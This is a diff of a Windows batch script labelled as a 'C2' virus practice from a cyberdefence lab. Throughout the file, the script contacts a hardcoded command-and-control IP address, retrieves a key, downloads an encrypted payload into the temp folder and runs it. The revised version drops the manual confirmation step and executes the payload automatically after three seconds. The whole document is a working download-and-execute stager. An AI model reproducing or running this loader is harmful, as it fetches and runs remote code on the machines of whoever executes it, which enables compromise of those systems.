@@ -1,97 +1,93 @@
 @echo off
 setlocal EnableDelayedExpansion
-chcp 65001 >nul 2>&1
-title C2 DEBUG - FIXED VERSION
+title C2 VirusPracticaAlex - 100% Stable
+color 0A
 
 echo.
-echo ╔══════════════════════════════════════╗
-echo ║     🔥 C2 DEBUG - FIXED 🔧           ║
-echo ║        VirusPracticaAlex             ║
-echo ╚══════════════════════════════════════╝
+echo ╔══════════════════════════════════════════════════════╗
+echo ║  🔥 C2 VIRUSPRÁCTICA - ESTABLE 100% 🔥                ║
+echo ║  Alex Montilla - Ciberdefensa Lab                    ║
+echo ╚══════════════════════════════════════════════════════╝
 echo.
 
 set "BASE=http://82.29.153.101:8080"
-set "FILE=%temp%\sc.bat"
+set "FILE=%TEMP%\sc.bat"
 
-echo 📍 TEMP: %temp%
-echo 🌐 BASE: %BASE%
+echo 🌐 TARGET: %BASE%
+echo 📁 OUTPUT: %FILE%
 echo.
 
-REM ===== 1. TIMESTAMP - FIXED =====
-echo 🔢 [1] Generando TS (MÉTODO 1: PowerShell)...
-powershell -NoP -Command "Write-Output ([int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds())" > "%temp%\ts.txt"
-set /p TS=<"%temp%\ts.txt"
-del "%temp%\ts.txt"
-echo    -> TS=%TS%
-echo    -> LEN=%TS:~9%
+REM ===== 1. TIMESTAMP (SÚPER SIMPLE) =====
+echo 🔢 [1/4] TIMESTAMP...
+powershell -Command "(Get-Date).ToUniversalTime().Subtract((Get-Date '1970-01-01')).TotalSeconds" > "%TEMP%\ts.tmp"
+set /p TS= < "%TEMP%\ts.tmp"
+del "%TEMP%\ts.tmp" 2>nul
+echo    ✓ TS=%TS%
 echo.
 
-REM ===== 2. KEY - FIXED =====
-echo 🔑 [2] KEY Generation...
-echo    -> URL: %BASE%/auth/key?ts=%TS%
-curl -s "%BASE%/auth/key?ts=%TS%" > "%temp%\key.txt" 2>"%temp%\curl_key_err.txt"
+REM ===== 2. KEY (SIN REDIRECCIONES COMPLEJAS) =====
+echo 🔑 [2/4] KEY...
+set "REQ_URL=%BASE%/auth/key?ts=%TS%"
+echo    URL: %REQ_URL%
 
-set /p KEY=<"%temp%\key.txt"
-if "!KEY!"=="" (
-    echo    ❌ KEY VACÍA
-    echo    📄 KEY FILE: %temp%\key.txt
-    echo    📄 CURL ERR: %temp%\curl_key_err.txt
+REM MÉTODO ULTRA-SEGURO: curl directo a variable
+for /f "tokens=*" %%i in ('curl -s --max-time 5 "%REQ_URL%"') do (
+    set "KEY=%%i"
+    goto :got_key
+)
+:got_key
+if not defined KEY (
+    echo    ❌ NO KEY RECEIVED
+    echo    🔍 Test manual: curl -s "%REQ_URL%"
     pause
     exit /b 1
 )
 
-echo    -> KEY=!KEY:~0,44!
-echo    -> LEN=!KEY:~43!
-if "!KEY:~43!" NEQ "44" (
-    echo    ❌ LEN inválida
+set KEY_LEN=0
+for /l %%i in (0,1,50) do if "!KEY:~%%i,1!" neq "" set /a KEY_LEN=%%i+1
+
+echo    ✓ KEY=%KEY:~0,20%... (%KEY_LEN% chars)
+if %KEY_LEN% neq 44 (
+    echo    ❌ KEY LEN != 44
     pause
     exit /b 1
 )
-echo    ✅ KEY OK ✓
 echo.
 
-REM ===== 3. PAYLOAD - FIXED =====
-echo 📥 [3] Downloading...
-echo    -> HEADER: X-Decrypt-Key: !KEY:~0,44!
-curl -s ^
-  -H "X-Decrypt-Key: !KEY:~0,44!" ^
-  "%BASE%/payload/encrypted" ^
-  -o "!FILE!" ^
-  --max-time 10 ^
-  > "%temp%\curl_payload.txt" 2>&1
+REM ===== 3. PAYLOAD (URL EN VARIABLE) =====
+echo 📥 [3/4] PAYLOAD...
+set "PAYLOAD_URL=%BASE%/payload/encrypted"
+curl -s --max-time 10 -H "X-Decrypt-Key: %KEY%" "%PAYLOAD_URL%" -o "%FILE%"
 
 if errorlevel 1 (
-    echo    ❌ CURL ERROR
-    type "%temp%\curl_payload.txt"
+    echo    ❌ DOWNLOAD FAILED
     pause
     exit /b 1
 )
 
-if not exist "!FILE!" (
-    echo    ❌ FILE NO CREATED
-    dir "%temp%\sc*"
+if not exist "%FILE%" (
+    echo    ❌ FILE NOT CREATED
+    dir "%TEMP%\sc*"
     pause
     exit /b 1
 )
 
-for %%F in ("!FILE!") do set "SIZE=%%~zF"
-echo    -> SIZE: %SIZE% bytes ✓
+for %%F in ("%FILE%") do set FILESIZE=%%~zF
+echo    ✓ %FILE% (%FILESIZE% bytes)
 echo.
 
-REM ===== 4. PREVIEW =====
-echo 👁️ [4] PAYLOAD PREVIEW:
-echo    ╔═══════
-type "!FILE!" | more /e +1 /n 15
-echo    ═══════╝
-echo.
+REM ===== 4. PREVIEW + EXEC =====
+echo 👁️  [4/4] PREVIEW:
+echo    ╔══════
+type "%FILE%" | findstr /n "^" | more /e +1 /n 12
+echo    ║
+echo ⚡  EXECUTANDO en 3s... [Ctrl+C para abortar]
+timeout /t 3 /nobreak >nul
 
-REM ===== 5. EXECUTE =====
-echo ⚡ [5] EXECUTING...
-echo    [ENTER] = Run  |  [Ctrl+C] = Abort
+echo    → call "%FILE%"
+call "%FILE%"
+
+echo.
+echo ✅ MISSION COMPLETE ✓
+echo 📁 Cleanup: %FILE% queda para debug
 pause >nul
-
-echo    -> call "!FILE!"
-call "!FILE!"
-
-echo ✅ [DONE]
-pause
